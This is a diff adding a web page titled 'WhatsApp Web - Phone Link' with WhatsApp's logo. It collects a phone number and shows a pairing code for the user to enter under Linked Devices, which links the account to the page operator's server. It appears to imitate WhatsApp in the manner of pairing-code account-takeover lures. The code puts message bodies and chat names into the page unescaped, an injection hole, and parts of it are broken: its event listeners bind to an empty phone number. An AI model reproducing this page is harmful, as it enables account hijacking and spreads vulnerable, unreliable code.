@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web - Phone Link</title>
+    <link rel="stylesheet" href="whatsapp.css">
+</head>
+<body>
+    <!-- Phone Linking Screen -->
+    <div id="phone-link-screen" class="screen active">
+        <div class="phone-link-container">
+            <div class="phone-link-box">
+                <img src="https://web.whatsapp.com/img/logo/1x/logo.png" class="logo">
+                <h1>WhatsApp Web</h1>
+                <p>Link account using phone number</p>
+                
+                <div class="input-section">
+                    <input type="tel" id="phone-number" placeholder="Enter phone number (1234567890)" maxlength="15">
+                    <button onclick="generateLinkCode()" id="generate-btn">Generate Link Code</button>
+                </div>
+                
+                <div id="link-status"></div>
+                
+                <div id="code-display" class="code-display" style="display:none;">
+                    <div class="code-title">Enter this 8-digit code:</div>
+                    <div class="big-code" id="link-code"></div>
+                    <div class="code-instructions">
+                        WhatsApp > <strong>Linked Devices</strong> > <strong>Link a Device</strong> ><br>
+                        <strong>Link with phone number</strong> > Enter code above
+                    </div>
+                    <button onclick="refreshCode()" class="refresh-btn">↻ Refresh Code</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- WhatsApp Web Chat -->
+    <div id="whatsapp-web" class="screen whatsapp-web" style="display:none;">
+        <div class="web-container">
+            <div class="sidebar">
+                <div class="sidebar-header">
+                    <span id="account-phone"></span>
+                    <button onclick="logout()">Logout</button>
+                </div>
+                <div class="chats" id="chat-list"></div>
+            </div>
+            <div class="main-chat">
+                <div class="chat-header" id="chat-header">Select a chat</div>
+                <div class="messages" id="message-list"></div>
+                <div class="input-bar">
+                    <input type="text" id="message-input" placeholder="Type message..." disabled>
+                    <button id="send-button" onclick="sendMessage()" disabled>➤</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        let currentPhone = '';
+        let currentChatId = '';
+        const socket = io();
+
+        async function generateLinkCode() {
+            currentPhone = document.getElementById('phone-number').value.replace(/\D/g, '');
+            if (currentPhone.length < 10) return showStatus('Valid phone number required', 'error');
+
+            showStatus('Generating 8-digit link code...', 'loading');
+            
+            const res = await fetch('/api/link-phone', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phoneNumber: currentPhone})
+            });
+            
+            const data = await res.json();
+            if (data.success) {
+                document.getElementById('code-display').style.display = 'block';
+                document.getElementById('generate-btn').style.display = 'none';
+                showLinkCode(data.linkCode);
+                socket.emit('join-phone', currentPhone);
+                pollConnection();
+            } else {
+                showStatus(data.error, 'error');
+            }
+        }
+
+        function showLinkCode(code) {
+            document.getElementById('link-code').textContent = code;
+            showStatus('Copy 8-digit code above → WhatsApp Linked Devices → Link with phone number', 'success');
+        }
+
+        async function refreshCode() {
+            const res = await fetch(`/api/link-code/${currentPhone}`);
+            const data = await res.json();
+            showLinkCode(data.code);
+        }
+
+        function pollConnection() {
+            const check = async () => {
+                const res = await fetch(`/api/status/${currentPhone}`);
+                const status = await res.json();
+                
+                if (status.connected) {
+                    showWhatsAppWeb();
+                } else {
+                    setTimeout(check, 2000);
+                }
+            };
+            check();
+        }
+
+        function showWhatsAppWeb() {
+            document.getElementById('phone-link-screen').classList.remove('active');
+            document.getElementById('whatsapp-web').style.display = 'block';
+            document.getElementById('account-phone').textContent = currentPhone;
+        }
+
+        function logout() {
+            location.reload();
+        }
+
+        // Chat functions
+        function selectChat(chatId, name) {
+            currentChatId = chatId._serialized;
+            document.getElementById('chat-header').textContent = name || chatId.user;
+            document.getElementById('message-input').disabled = false;
+            document.getElementById('send-button').disabled = false;
+        }
+
+        async function sendMessage() {
+            const msg = document.getElementById('message-input').value.trim();
+            if (msg && currentChatId) {
+                socket.emit('send-to-phone', {
+                    phoneNumber: currentPhone,
+                    chatId: currentChatId,
+                    message: msg
+                });
+                document.getElementById('message-input').value = '';
+            }
+        }
+
+        // Events
+        socket.on(`phone:${currentPhone}:chats`, chats => {
+            const list = document.getElementById('chat-list');
+            list.innerHTML = chats.map(chat => `
+                <div class="chat-item" onclick="selectChat('${chat.id._serialized}', '${chat.name || chat.id.user}')">
+                    <strong>${chat.name || chat.id.user}</strong>
+                </div>
+            `).join('');
+        });
+
+        socket.on(`phone:${currentPhone}:message`, msg => {
+            if (msg.chatId === currentChatId) {
+                const messages = document.getElementById('message-list');
+                const div = document.createElement('div');
+                div.className = `msg ${msg.fromMe ? 'sent' : 'received'}`;
+                div.innerHTML = `<div>${msg.body}</div><small>${new Date(msg.time*1000).toLocaleTimeString()}</small>`;
+                messages.appendChild(div);
+                messages.scrollTop = messages.scrollHeight;
+            }
+        });
+
+        function showStatus(msg, type) {
+            document.getElementById('link-status').innerHTML = `<div class="status ${type}">${msg}</div>`;
+        }
+    </script>
+</body>
+</html>
